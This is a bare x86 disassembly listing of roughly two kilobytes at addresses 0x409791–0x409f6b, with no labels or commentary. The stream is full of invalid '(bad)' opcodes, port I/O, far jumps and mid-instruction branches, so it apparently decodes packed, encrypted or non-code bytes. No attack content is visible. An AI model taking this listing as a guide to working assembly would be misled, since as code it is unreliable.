  409791:	or     dh,bl
  409793:	out    0xc1,al
  409795:	fmul   st(1),st
  409797:	jmp    0x40980e
  409799:	mov    ah,ch
  40979b:	push   0xffffff97
  40979d:	jbe    0x409740
  40979f:	push   cs
  4097a0:	sbb    ah,BYTE PTR [edx+edi*2]
  4097a3:	xor    ecx,DWORD PTR [edx+0x666985c4]
  4097a9:	scas   eax,DWORD PTR es:[edi]
  4097aa:	fsubr  st(7),st
  4097ac:	adc    al,0x5a
  4097ae:	in     al,dx
  4097af:	cdq    
  4097b0:	in     eax,0x1c
  4097b2:	jae    0x40975f
  4097b4:	mov    al,0xa0
  4097b6:	mul    ah
  4097b8:	sbb    eax,0x5637f697
  4097bd:	dec    ecx
  4097be:	les    edi,FWORD PTR [ebx+0x69fc26b2]
  4097c4:	inc    esi
  4097c5:	jmp    0x9dab:0x6c2bdca5
  4097cc:	sub    eax,0x920b108e
  4097d1:	fcom   DWORD PTR [ebx]
  4097d3:	or     al,0xbf
  4097d5:	pop    ecx
  4097d6:	pop    ebx
  4097d7:	popa   
  4097d8:	std    
  4097d9:	test   DWORD PTR [ecx+0x58],ebx
  4097dc:	mov    esi,0x61948a60
  4097e1:	xor    edx,DWORD PTR [esi]
  4097e3:	inc    ecx
  4097e4:	cld    
  4097e5:	ins    DWORD PTR es:[edi],dx
  4097e6:	sbb    BYTE PTR [edx+edi*2],0xd9
  4097ea:	push   ss
  4097eb:	xchg   edi,eax
  4097ec:	out    0x87,eax
  4097ee:	scas   al,BYTE PTR es:[edi]
  4097ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097f0:	inc    ebx
  4097f1:	add    WORD PTR [esi],bp
  4097f4:	stos   BYTE PTR es:[edi],al
  4097f5:	in     al,dx
  4097f6:	add    BYTE PTR [eax-0x69],dl
  4097f9:	jmp    0x4097f4
  4097fb:	sbb    dl,BYTE PTR [edx]
  4097fd:	and    ebx,ebx
  4097ff:	call   0x6346eb33
  409804:	call   0x1252:0x751f10fe
  40980b:	pop    ebp
  40980c:	jmp    0x409813
  40980e:	sti    
  40980f:	addr16 push es
  409811:	xchg   BYTE PTR [ecx+ebp*8+0x32f753ef],al
  409818:	in     al,dx
  409819:	fsub   DWORD PTR [ebp-0x2a]
  40981c:	add    al,0x15
  40981e:	xchg   edi,eax
  40981f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409820:	push   0x40333e16
  409825:	(bad)  
  409826:	cmc    
  409827:	inc    ecx
  409828:	xchg   BYTE PTR [ecx+0x789d53e9],bl
  40982e:	inc    edi
  40982f:	cmc    
  409830:	ret    
  409831:	cdq    
  409832:	icebp  
  409833:	js     0x4097f5
  409835:	or     DWORD PTR [ecx+0x60],edi
  409838:	jmp    0x5ea0479b
  40983d:	rol    BYTE PTR [edi-0x5c1786e8],1
  409843:	ret    0x7ca4
  409846:	int3   
  409847:	push   ss
  409848:	cmp    edi,ecx
  40984a:	sbb    eax,0x36a70555
  40984f:	push   ebp
  409850:	int    0xd
  409852:	pop    edx
  409853:	push   edx
  409854:	and    eax,0x70373c85
  409859:	pop    esi
  40985a:	jg     0x40985e
  40985c:	sub    al,0x26
  40985e:	and    al,BYTE PTR [edx*8+0x7fe742ce]
  409865:	out    0x91,eax
  409867:	icebp  
  409868:	and    DWORD PTR [ebp+0x565e793f],ebp
  40986e:	jmp    0x409870
  409870:	add    dh,ah
  409872:	fdiv   st(4),st
  409874:	outs   dx,BYTE PTR ds:[esi]
  409875:	fs inc edi
  409877:	repz ja 0x4098a8
  40987a:	fmul   DWORD PTR [ecx-0x42b75d48]
  409880:	(bad)  
  409881:	stc    
  409882:	and    dh,BYTE PTR [ebp+edi*4-0x50]
  409886:	into   
  409887:	push   ss
  409888:	push   edx
  409889:	sub    al,0x30
  40988b:	bound  edi,QWORD PTR [ebp+0x28341b28]
  409891:	adc    DWORD PTR [ecx-0x24af4ab5],ecx
  409897:	push   edx
  409898:	std    
  409899:	pop    ebp
  40989a:	popf   
  40989b:	push   0xffffff9d
  40989d:	cmp    eax,edi
  40989f:	aas    
  4098a0:	xchg   edi,eax
  4098a1:	js     0x40984f
  4098a3:	in     al,dx
  4098a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a5:	sub    esp,DWORD PTR ds:[edx+eiz*8-0x37]
  4098aa:	pop    ecx
  4098ab:	ja     0x40985f
  4098ad:	test   al,0xaa
  4098af:	test   eax,0xef8a7b23
  4098b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098b5:	cwde   
  4098b6:	mov    eax,0xcc7c814
  4098bb:	mov    ds:0xfd017ce,eax
  4098c0:	cmp    al,BYTE PTR [ecx-0xf]
  4098c3:	pop    ecx
  4098c4:	mov    ah,0xb9
  4098c6:	test   eax,0x23e3651a
  4098cb:	fsub   st(0),st
  4098cd:	(bad)  
  4098ce:	mov    dh,0xca
  4098d0:	inc    ecx
  4098d1:	lahf   
  4098d2:	xor    ebx,DWORD PTR [esi-0x5f9d5687]
  4098d8:	sbb    DWORD PTR [edi],0x44
  4098db:	add    DWORD PTR [esi],ebx
  4098dd:	lock dec ebp
  4098df:	addr16 mov ch,0xf1
  4098e2:	add    ecx,ebx
  4098e4:	inc    ebp
  4098e5:	enter  0x6393,0x16
  4098e9:	and    al,0xcb
  4098eb:	pop    DWORD PTR [edx+0x36]
  4098ee:	pop    esi
  4098ef:	jg     0x409906
  4098f1:	popa   
  4098f2:	jbe    0x409882
  4098f4:	sbb    eax,0xdd1dd123
  4098f9:	mov    ds:0xc1d1ca5f,eax
  4098fe:	test   eax,0x6ca3e4b6
  409903:	sahf   
  409904:	out    0x7f,al
  409906:	dec    ebp
  409907:	call   0x49599942
  40990c:	push   0xffffff9b
  40990e:	cmp    al,0x1e
  409910:	stc    
  409911:	test   WORD PTR [eax],di
  409914:	pop    esp
  409915:	mov    WORD PTR [ebx+0x1ae3b7a1],cs
  40991b:	push   eax
  40991c:	inc    esp
  40991d:	jo     0x4098f2
  40991f:	sbb    BYTE PTR [eax],0x24
  409922:	jg     0x40996c
  409924:	adc    eax,0x653bbbe5
  409929:	(bad)  
  40992a:	in     al,0xab
  40992c:	mov    eax,ds:0x1161f654
  409931:	fdiv   QWORD PTR [ecx]
  409933:	fist   WORD PTR [edi+0x35849843]
  409939:	jnp    0x409985
  40993b:	and    al,0x78
  40993d:	mov    ah,0xd1
  40993f:	cdq    
  409940:	push   edx
  409941:	mov    ch,BYTE PTR [ecx-0x66]
  409944:	mov    edx,0x5e24654b
  409949:	push   eax
  40994a:	loop   0x40998e
  40994c:	jne    0x4099c4
  40994e:	mov    bl,0x77
  409950:	inc    edx
  409951:	fstp   DWORD PTR [edi-0x4c591bba]
  409957:	push   es
  409958:	mov    ds:0xbaf0ee08,eax
  40995d:	ret    
  40995e:	mov    bh,0xe1
  409960:	popf   
  409961:	jno    0x4099b0
  409963:	xor    ebx,eax
  409965:	fsubr  DWORD PTR [edx+0x41]
  409968:	repnz xchg ebp,eax
  40996a:	test   BYTE PTR [ebp+0x24],bl
  40996d:	xchg   BYTE PTR [eax],dl
  40996f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409970:	jmp    0x409907
  409972:	jae    0x409986
  409974:	repnz inc esi
  409976:	mov    esp,0x380bab07
  40997b:	jae    0x4099e6
  40997d:	pop    esp
  40997e:	jno    0x40999b
  409980:	daa    
  409981:	pop    ebx
  409982:	mov    edi,0x2ad2a74a
  409987:	nop
  409988:	stos   DWORD PTR es:[edi],eax
  409989:	rcr    ebp,0x7d
  40998c:	in     al,0xaf
  40998e:	adc    DWORD PTR [ebp+0x4f],edi
  409991:	test   edx,0xf33b6777
  409997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409998:	and    al,0x4a
  40999a:	test   bl,al
  40999c:	jmp    ecx
  40999e:	jg     0x4099e9
  4099a0:	push   ds
  4099a1:	and    ah,bl
  4099a3:	mov    eax,0xe8e67e55
  4099a8:	pop    esi
  4099a9:	outs   dx,BYTE PTR ds:[esi]
  4099aa:	add    BYTE PTR [edx+0xbd55c2c],dh
  4099b0:	aas    
  4099b1:	mov    BYTE PTR [edx+edi*1-0x5382d429],0xba
  4099b9:	adc    DWORD PTR [ebx],ebx
  4099bb:	es push cs
  4099bd:	lock ret 0x52b8
  4099c1:	adc    DWORD PTR [ecx-0x70],0xffffffd7
  4099c5:	pop    esi
  4099c6:	popa   
  4099c7:	pop    es
  4099c8:	sahf   
  4099c9:	imul   esp,eax,0xa35e7b0d
  4099cf:	jp     0x409a47
  4099d1:	jmp    0xd8d4c721
  4099d6:	fst    st(2)
  4099d8:	pop    ebp
  4099d9:	pop    esp
  4099da:	aam    0xe9
  4099dc:	pop    es
  4099dd:	stos   BYTE PTR es:[edi],al
  4099de:	mov    ah,0xc9
  4099e0:	aad    0x3e
  4099e2:	add    eax,0x331fcd0f
  4099e7:	inc    ecx
  4099e8:	xor    DWORD PTR [edi+0x75cf3ccf],esp
  4099ee:	xor    al,0xac
  4099f0:	lods   eax,DWORD PTR ss:[esi]
  4099f2:	pop    ds
  4099f3:	es sbb al,0x3d
  4099f6:	or     al,0x11
  4099f8:	pop    esi
  4099f9:	imul   edi,DWORD PTR [edi],0xe2cb542c
  4099ff:	push   es
  409a00:	adc    ebx,ecx
  409a02:	sbb    al,0xb9
  409a04:	cmp    DWORD PTR [eax+edx*4+0x4a760fbf],esp
  409a0b:	mov    BYTE PTR [edi-0x5e],0x45
  409a0f:	lods   al,BYTE PTR ds:[esi]
  409a10:	ja     0x409a01
  409a12:	xchg   esi,eax
  409a13:	hlt    
  409a14:	(bad)  
  409a15:	cmp    edx,esp
  409a17:	xchg   DWORD PTR [eax+0x29ff125e],ecx
  409a1d:	cmp    al,0x1f
  409a1f:	shl    cl,cl
  409a21:	fcomp  QWORD PTR [esi]
  409a23:	jg     0x409a7b
  409a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a26:	dec    esi
  409a27:	sahf   
  409a28:	mov    al,0x77
  409a2a:	xchg   edi,eax
  409a2b:	jb     0x409a02
  409a2d:	and    BYTE PTR [eax+0x5d7c47cf],al
  409a33:	mov    ds:0x888a6c3d,eax
  409a38:	call   0xe7d3:0xe5f32059
  409a3f:	les    ecx,FWORD PTR [ecx+eax*2-0x35d0ee51]
  409a46:	push   eax
  409a47:	(bad)  
  409a48:	fstp   DWORD PTR [ebp-0x64]
  409a4b:	adc    al,BYTE PTR [edi+0x14e8a8b3]
  409a51:	aas    
  409a52:	inc    ecx
  409a53:	cld    
  409a54:	dec    ecx
  409a55:	ret    0x2fcc
  409a58:	and    BYTE PTR [eax-0xe22ded6],ah
  409a5e:	aas    
  409a5f:	pop    edx
  409a60:	das    
  409a61:	sbb    DWORD PTR [eax],esp
  409a63:	shl    BYTE PTR ds:0xb198adc9,cl
  409a69:	adc    eax,DWORD PTR [eax-0x2f]
  409a6c:	xor    al,0x56
  409a6e:	inc    esi
  409a6f:	jae    0x409acc
  409a71:	xlat   BYTE PTR ds:[ebx]
  409a72:	mov    bh,0x8
  409a74:	in     eax,dx
  409a75:	add    ebp,DWORD PTR [edi]
  409a77:	pop    ds
  409a78:	fwait
  409a79:	call   0x812f:0x464cb608
  409a80:	push   ds
  409a81:	(bad)  
  409a82:	mov    ah,0x2e
  409a84:	(bad)  
  409a85:	mov    BYTE PTR [ebx+0x7f],dh
  409a88:	fistp  DWORD PTR [eax]
  409a8a:	aas    
  409a8b:	in     al,dx
  409a8c:	mov    ebx,0x290e5ed1
  409a91:	popa   
  409a92:	pop    ecx
  409a93:	ret    
  409a94:	sbb    ebx,ecx
  409a96:	(bad)  
  409a97:	fiadd  DWORD PTR [ebx]
  409a99:	jmp    0x409a2b
  409a9b:	lds    ebx,FWORD PTR [ebx+0x24]
  409a9e:	retf   
  409a9f:	cs sbb al,ah
  409aa2:	or     al,0x60
  409aa4:	aas    
  409aa5:	and    cl,BYTE PTR ds:0xf234a64c
  409aab:	adc    al,BYTE PTR [ebx-0x52]
  409aae:	mov    BYTE PTR [ebx],dh
  409ab0:	sbb    al,BYTE PTR [edi]
  409ab2:	or     esi,eax
  409ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ab5:	icebp  
  409ab6:	bound  ebx,QWORD PTR [bp+di]
  409ab9:	mov    al,ds:0xf16de03c
  409abe:	das    
  409abf:	dec    edx
  409ac0:	dec    DWORD PTR [eax+0x22f72c5]
  409ac6:	mov    ch,0x97
  409ac8:	or     al,bl
  409aca:	hlt    
  409acb:	dec    edx
  409acc:	jp     0x409a80
  409ace:	loopne 0x409aa6
  409ad0:	enter  0xd1f8,0x5a
  409ad4:	add    dl,dl
  409ad6:	add    BYTE PTR [ebp-0x7e009af9],ah
  409adc:	repnz lods al,BYTE PTR ds:[esi]
  409ade:	outs   dx,DWORD PTR ds:[esi]
  409adf:	or     eax,0xa709b226
  409ae4:	xlat   BYTE PTR ds:[ebx]
  409ae5:	jg     0x409a9a
  409ae7:	and    bh,bl
  409ae9:	jg     0x409b56
  409aeb:	leave  
  409aec:	ret    0x600b
  409aef:	popa   
  409af0:	in     al,dx
  409af1:	ror    BYTE PTR [ecx],1
  409af3:	inc    edx
  409af4:	test   al,0xce
  409af6:	or     DWORD PTR [ebp+0x4c1698a7],ebp
  409afc:	(bad)  
  409afd:	fidivr DWORD PTR [edx+ebx*4+0x3824a8e5]
  409b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b05:	inc    edx
  409b06:	mov    edi,0xbc683f09
  409b0b:	nop
  409b0c:	adc    bl,BYTE PTR [esi]
  409b0e:	je     0x409abb
  409b10:	inc    ebp
  409b11:	push   edi
  409b12:	cmp    dl,0x26
  409b15:	sbb    al,0x6c
  409b17:	push   cs
  409b18:	mov    edx,0x785bb947
  409b1d:	sbb    dh,ch
  409b1f:	dec    ebp
  409b20:	clc    
  409b21:	pop    esp
  409b22:	out    dx,al
  409b23:	xchg   BYTE PTR [eax],dl
  409b25:	pop    ebx
  409b26:	es push ebp
  409b28:	sbb    eax,0x5e6c8446
  409b2d:	sub    eax,0x4847e7c3
  409b32:	cwde   
  409b33:	or     ch,bl
  409b35:	fsubr  DWORD PTR [edi]
  409b37:	or     DWORD PTR [eax-0x4],eax
  409b3a:	mov    gs,WORD PTR [edx]
  409b3c:	dec    esp
  409b3d:	xchg   edi,eax
  409b3e:	mov    ah,0x50
  409b40:	arpl   WORD PTR [esi+ebx*1-0xd],si
  409b44:	mov    al,0x64
  409b46:	mov    ds:0x78cf41c1,eax
  409b4b:	std    
  409b4c:	add    al,0x88
  409b4e:	(bad)  
  409b4f:	sbb    eax,0xc309b89e
  409b54:	xchg   esp,eax
  409b55:	cmp    ecx,DWORD PTR [esi-0x65110847]
  409b5b:	push   cs
  409b5c:	aad    0x2a
  409b5e:	or     eax,0x228835a6
  409b63:	dec    esi
  409b64:	dec    ebp
  409b65:	gs mov ecx,0x8a83cd22
  409b6b:	xor    eax,0x433e6d04
  409b70:	xchg   DWORD PTR [ecx+edi*4-0x8aab034],esp
  409b77:	xchg   ebx,eax
  409b78:	cwde   
  409b79:	(bad)  
  409b7b:	dec    esi
  409b7c:	fisub  DWORD PTR [esi]
  409b7e:	iret   
  409b7f:	pop    esp
  409b80:	lods   eax,DWORD PTR ds:[esi]
  409b81:	jmp    0x20ae30d
  409b86:	add    dl,BYTE PTR [edi]
  409b88:	cdq    
  409b89:	jle    0x409bc2
  409b8b:	gs test al,0x2b
  409b8e:	add    cl,BYTE PTR [eax-0x3a]
  409b91:	adc    ecx,DWORD PTR [eax]
  409b93:	rcl    edx,1
  409b95:	dec    esp
  409b96:	sbb    al,0x95
  409b98:	xor    eax,DWORD PTR [esi+ecx*2+0x73]
  409b9c:	mov    edx,cs
  409b9e:	dec    eax
  409b9f:	push   eax
  409ba0:	outs   dx,BYTE PTR ds:[esi]
  409ba1:	dec    ebp
  409ba2:	cmp    edi,DWORD PTR [ebx]
  409ba4:	and    BYTE PTR [ebp-0x6fea03c7],0x13
  409bab:	push   cs
  409bac:	cmp    bh,BYTE PTR [ebx-0x1d]
  409baf:	cs push ecx
  409bb1:	fsubr  st,st(1)
  409bb3:	mov    WORD PTR [esi-0x5c],ds
  409bb6:	sbb    DWORD PTR [ebx+edi*1+0x38],ecx
  409bba:	jne    0x409bf6
  409bbc:	mov    ds:0xbe5c798d,eax
  409bc1:	daa    
  409bc2:	xchg   bp,ax
  409bc4:	fadd   DWORD PTR [ebp-0x628f8d18]
  409bca:	(bad)  
  409bcb:	or     eax,0x5cfc706
  409bd0:	scas   eax,DWORD PTR es:[edi]
  409bd1:	inc    ecx
  409bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bd3:	or     al,0x35
  409bd5:	lock cmp esp,esi
  409bd8:	outs   dx,BYTE PTR ds:[esi]
  409bd9:	adc    al,0xa4
  409bdb:	push   edi
  409bdc:	mov    BYTE PTR ds:0x77e81b64,ch
  409be2:	test   eax,0x711f57d6
  409be7:	or     eax,0x33f5a172
  409bec:	arpl   ax,bx
  409bee:	sti    
  409bef:	jmp    0x4afc:0x384eddce
  409bf6:	adc    ebx,DWORD PTR [edx+0x37]
  409bf9:	add    eax,0xcc040a17
  409bfe:	mov    cl,0xcc
  409c00:	(bad)  
  409c01:	xor    DWORD PTR [eax],edi
  409c03:	fwait
  409c04:	pop    ebx
  409c05:	jp     0x409bc4
  409c07:	push   edx
  409c08:	jle    0x409c3a
  409c0a:	mov    dh,0x28
  409c0c:	and    esi,ebx
  409c0e:	ss jns 0x409c24
  409c11:	inc    edx
  409c12:	jecxz  0x409c17
  409c14:	(bad)  [ebx-0x21ed29b3]
  409c1a:	sbb    bh,BYTE PTR [eax-0x6f]
  409c1d:	clc    
  409c1e:	dec    ecx
  409c1f:	aam    0x93
  409c21:	neg    edx
  409c23:	add    al,BYTE PTR [esi+0x52]
  409c26:	inc    ebx
  409c27:	out    0xa0,al
  409c29:	mov    ch,0x52
  409c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c2c:	(bad)  
  409c2d:	cmp    BYTE PTR [ebp+0x4e1e451c],ch
  409c33:	inc    ebx
  409c34:	jnp    0x409bc9
  409c36:	imul   DWORD PTR [ecx-0x69]
  409c39:	in     al,dx
  409c3a:	or     al,BYTE PTR [edx+ecx*2]
  409c3d:	repz out 0xd5,al
  409c40:	cmp    eax,0xfb1b9ccb
  409c45:	ins    BYTE PTR es:[edi],dx
  409c46:	je     0x409c62
  409c48:	sti    
  409c49:	and    BYTE PTR [edx+0x3b809177],cl
  409c4f:	test   BYTE PTR [edi+eiz*8+0x6],bh
  409c53:	xchg   ebp,eax
  409c54:	rcl    DWORD PTR [edi+0xd],1
  409c57:	fs pop edi
  409c59:	sub    ebp,DWORD PTR [ebx]
  409c5b:	fdiv   st,st(3)
  409c5d:	pop    eax
  409c5e:	pusha  
  409c5f:	retf   
  409c60:	xor    eax,0x46923158
  409c65:	adc    ebx,DWORD PTR es:[ebp-0x2e]
  409c69:	iret   
  409c6a:	inc    esp
  409c6b:	call   0xc8c8:0xb21817c
  409c72:	(bad)  [esi-0x5861612c]
  409c78:	mov    cl,0xeb
  409c7a:	inc    ebp
  409c7b:	pusha  
  409c7c:	rcr    BYTE PTR [edi+0x79],0xe
  409c80:	and    bl,BYTE PTR ds:0xd8f2e29e
  409c86:	sub    al,0xa0
  409c88:	cdq    
  409c89:	sub    al,0x39
  409c8b:	fiadd  WORD PTR [esi+0x46]
  409c8e:	mov    ds:0xd09cf94c,al
  409c93:	enter  0x651c,0xee
  409c97:	stos   DWORD PTR es:[edi],eax
  409c98:	jb     0x409cab
  409c9a:	push   edi
  409c9b:	jo     0x409c41
  409c9d:	sub    ch,cl
  409c9f:	pusha  
  409ca0:	clc    
  409ca1:	xchg   edi,eax
  409ca2:	xor    eax,0x9a350ad7
  409ca7:	imul   ebx,eax,0x217ce2da
  409cad:	mov    bh,0x6f
  409caf:	fld    QWORD PTR [esi-0x45]
  409cb2:	aad    0xf6
  409cb4:	mov    ds:0x97e2b803,eax
  409cb9:	jo     0x409cb6
  409cbb:	dec    edx
  409cbc:	mov    edi,0x966c4983
  409cc1:	aad    0x88
  409cc3:	popa   
  409cc4:	ja     0x409c75
  409cc6:	add    eax,0xbd0f946a
  409ccb:	mov    dh,0x2
  409ccd:	aas    
  409cce:	cld    
  409ccf:	fcom   DWORD PTR [edi-0x68f3ebd5]
  409cd5:	mov    ecx,0x6723bb37
  409cda:	imul   ebp,DWORD PTR [ecx+ecx*8],0x7ecdbdf4
  409ce1:	lods   al,BYTE PTR ds:[esi]
  409ce2:	sbb    bh,BYTE PTR [eax]
  409ce4:	xor    eax,0xd5fb1ac6
  409ce9:	(bad)
  409cec:	mov    ah,0xc1
  409cee:	in     al,dx
  409cef:	push   0xed625682
  409cf4:	pop    esp
  409cf5:	(bad)
  409cf8:	and    al,0x1b
  409cfa:	pop    esi
  409cfb:	repz push esp
  409cfd:	sar    DWORD PTR [ebx-0x37],cl
  409d00:	xchg   ecx,eax
  409d01:	outs   dx,DWORD PTR ds:[esi]
  409d02:	dec    edx
  409d03:	and    al,0x92
  409d05:	mov    BYTE PTR [esi+0x21a87a75],al
  409d0b:	xor    eax,0xbb2829d9
  409d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d11:	(bad)  
  409d12:	cwde   
  409d13:	sbb    eax,0xf2772278
  409d18:	jl     0x409cea
  409d1a:	std    
  409d1b:	stos   DWORD PTR es:[edi],eax
  409d1c:	jmp    0x6d2570cd
  409d21:	ret    0xb484
  409d24:	or     BYTE PTR [esi-0x1a],bh
  409d27:	push   eax
  409d28:	inc    esi
  409d29:	jle    0x409d42
  409d2b:	pop    eax
  409d2c:	cli    
  409d2d:	cdq    
  409d2e:	dec    esp
  409d2f:	jmp    0xf53ac63f
  409d34:	dec    edi
  409d35:	daa    
  409d36:	iret   
  409d37:	inc    edx
  409d38:	mov    cl,0x2
  409d3a:	or     BYTE PTR [ecx-0x59cb5d7b],0x37
  409d41:	add    bh,dl
  409d43:	jmp    0x598e:0x8ecd7680
  409d4a:	or     al,0x48
  409d4c:	mov    al,ds:0x7c52823f
  409d51:	mov    eax,DWORD PTR [ebp+0x5f74491f]
  409d57:	test   eax,0x7ba7034e
  409d5c:	jne    0x409d9b
  409d5e:	jb     0x409dc4
  409d60:	aaa    
  409d61:	adc    BYTE PTR [edi-0x3f],0x12
  409d65:	mov    BYTE PTR [ecx],cl
  409d67:	xor    DWORD PTR [esi-0x34cc53a5],0x6c
  409d6e:	mov    ecx,0xde08ddb5
  409d73:	mov    esi,0x991d3fde
  409d78:	push   es
  409d79:	dec    esp
  409d7a:	mov    esi,0xf2dcd1b4
  409d7f:	add    DWORD PTR [edi],0x7baef109
  409d85:	inc    esi
  409d86:	loopne 0x409db0
  409d88:	xchg   esp,eax
  409d89:	test   BYTE PTR [eax-0x79],bl
  409d8c:	lods   eax,DWORD PTR ds:[esi]
  409d8d:	push   0x9c1e670b
  409d92:	cmc    
  409d93:	jbe    0x409e0a
  409d95:	test   BYTE PTR [edx],ch
  409d97:	mov    esi,0x44c0c3b
  409d9c:	fadd   QWORD PTR [edx-0x62ef69cd]
  409da2:	(bad)  
  409da4:	pop    ebx
  409da5:	or     BYTE PTR [esi+0x37728403],cl
  409dab:	push   cs
  409dac:	scas   al,BYTE PTR es:[edi]
  409dad:	mov    ?,WORD PTR [eax-0x2d796cbd]
  409db3:	(bad)  
  409db5:	mov    edx,0x3aface5a
  409dba:	in     al,0x65
  409dbc:	(bad)  
  409dbd:	xchg   esp,eax
  409dbe:	je     0x409dc4
  409dc0:	pop    eax
  409dc1:	arpl   WORD PTR [esp+esi*4-0x61],bx
  409dc5:	or     DWORD PTR [esi+0x72],ebx
  409dc8:	test   BYTE PTR [edi],cl
  409dca:	mov    ecx,0xf65c7248
  409dcf:	fsubr  DWORD PTR [esi]
  409dd1:	neg    DWORD PTR [edx-0x29]
  409dd4:	imul   ecx,DWORD PTR [eax+0x7af12b23],0x9e820db1
  409dde:	or     eax,0xa2be82e
  409de3:	in     al,0x71
  409de5:	push   0x41ce7ed5
  409dea:	inc    edx
  409deb:	and    esi,DWORD PTR [ebx+0x11]
  409dee:	sub    DWORD PTR [edx],esp
  409df0:	hlt    
  409df1:	and    eax,0x39261906
  409df6:	call   0xca48:0x78fc514d
  409dfd:	idiv   BYTE PTR [ecx+edx*2]
  409e00:	sbb    al,0x17
  409e02:	ret    
  409e03:	fisubr DWORD PTR [ebx-0x41b98464]
  409e09:	pop    ds
  409e0a:	adc    eax,0x2b4582c5
  409e0f:	retf   0x523a
  409e12:	fwait
  409e13:	and    bh,BYTE PTR [ebp-0x6df0eac7]
  409e19:	ds mov esp,0x8a35d446
  409e1f:	or     BYTE PTR [edi-0xc],ch
  409e22:	pusha  
  409e23:	adc    edi,DWORD PTR [esi-0x45]
  409e26:	jae    0x409e7d
  409e28:	mov    bl,0x3b
  409e2a:	jg     0x409dcd
  409e2c:	jmp    0xf174:0xb6869c19
  409e33:	add    BYTE PTR [esi-0x7becfcaf],bh
  409e39:	xchg   ebx,eax
  409e3a:	adc    ebp,ecx
  409e3c:	mov    edx,0x24c71711
  409e41:	lods   al,BYTE PTR ds:[esi]
  409e42:	jnp    0x409eb2
  409e44:	mov    ds,WORD PTR [ecx+0x19]
  409e47:	pop    edi
  409e48:	rol    edi,1
  409e4a:	sbb    BYTE PTR [ebx+0x9],0xf0
  409e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e4f:	sub    eax,0xd647582c
  409e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e55:	pop    ds
  409e56:	pop    ecx
  409e57:	inc    esp
  409e58:	imul   edx,esp,0xffffffdb
  409e5b:	imul   eax,DWORD PTR [edi-0x60d86d11],0x1e
  409e62:	(bad)  
  409e63:	js     0x409de8
  409e65:	jecxz  0x409e01
  409e67:	add    edx,DWORD PTR [edi+0x2c858d59]
  409e6d:	popa   
  409e6e:	je     0x409df6
  409e70:	fwait
  409e71:	je     0x409e54
  409e73:	mov    al,0xc
  409e75:	xchg   esp,edi
  409e77:	push   0x43645778
  409e7c:	popf   
  409e7d:	push   edi
  409e7e:	sub    DWORD PTR [ecx-0x36e66e24],esi
  409e84:	cs test eax,0x6707ae64
  409e8a:	xchg   edi,eax
  409e8b:	mov    DWORD PTR ds:0x58c35cff,ebp
  409e91:	pop    ebp
  409e92:	jbe    0x409f0d
  409e94:	hlt    
  409e95:	sub    BYTE PTR [ebx],dl
  409e97:	ret    0xdb
  409e9a:	sub    al,0xfa
  409e9c:	and    al,0x69
  409e9e:	sub    edx,DWORD PTR [ebx]
  409ea0:	shr    BYTE PTR [ebp-0x7],cl
  409ea3:	daa    
  409ea4:	or     eax,0x7aad2f3c
  409ea9:	je     0x409e54
  409eab:	jbe    0x409e37
  409ead:	(bad)  
  409eae:	fcmovne st,st(6)
  409eb0:	jne    0x409e53
  409eb2:	and    ah,BYTE PTR [ebp-0x329d6530]
  409eb8:	mov    ch,BYTE PTR [ebp+0x2a]
  409ebb:	push   eax
  409ebc:	imul   ebp,DWORD PTR [ebp-0x3ab5d2f9],0xffffffcd
  409ec3:	push   ebx
  409ec4:	stos   DWORD PTR es:[edi],eax
  409ec5:	mov    BYTE PTR [eax+esi*1],bh
  409ec8:	data16 jge 0x409ea8
  409ecb:	inc    edi
  409ecc:	js     0x409f12
  409ece:	and    DWORD PTR [ecx+0x5b7fe067],0xffffff8e
  409ed5:	cld    
  409ed6:	mov    ah,0xfd
  409ed8:	mov    bh,0x0
  409eda:	or     eax,eax
  409edc:	call   0x4bebc5ea
  409ee1:	xchg   ebp,eax
  409ee2:	and    ebp,ebx
  409ee4:	add    ch,cl
  409ee6:	add    ebx,DWORD PTR [edx]
  409ee8:	ss pop edi
  409eea:	mov    ebx,0x99ae01ec
  409eef:	and    dh,BYTE PTR [edx]
  409ef1:	xor    DWORD PTR [ecx+0x45],edi
  409ef4:	sub    BYTE PTR [edx+0x5aeafc03],ah
  409efa:	add    DWORD PTR ds:0x96da5f96,ebp
  409f00:	pop    eax
  409f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f02:	test   BYTE PTR [ecx+0x69],0x8b
  409f06:	adc    al,0x38
  409f08:	fist   DWORD PTR [edx+0x31cd75a7]
  409f0e:	lods   al,BYTE PTR ds:[esi]
  409f0f:	js     0x409f06
  409f11:	fisub  WORD PTR [edi-0x45362155]
  409f17:	js     0x409f1c
  409f19:	call   0xee6f:0x492587b1
  409f20:	and    al,0xcd
  409f22:	adc    dl,BYTE PTR [eax+0x4d9c4db9]
  409f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f29:	mov    esp,0xb3618107
  409f2e:	repnz or ch,BYTE PTR [esi+0x5a0cb824]
  409f35:	cld    
  409f36:	mov    ebp,0xf0dc07
  409f3b:	cmp    eax,0x3198917e
  409f40:	cmp    BYTE PTR fs:[edi+0x5f],cl
  409f44:	adc    BYTE PTR [ecx+ecx*8],dh
  409f47:	pop    esp
  409f48:	fs mov eax,0x17897397
  409f4e:	rcl    BYTE PTR [eax+0x40],cl
  409f51:	mov    edx,0x4486ae7c
  409f56:	mov    ds:0xeb21ac00,eax
  409f5b:	push   edi
  409f5c:	inc    edx
  409f5d:	jb     0x409f11
  409f5f:	inc    esp
  409f60:	fistp  WORD PTR [edi]
  409f62:	xchg   ecx,eax
  409f63:	rcr    DWORD PTR [edi],cl
  409f65:	push   ss
  409f66:	mov    esi,esp
  409f68:	push   ecx
  409f69:	test   ebp,edi
  409f6b:	pop    ebx
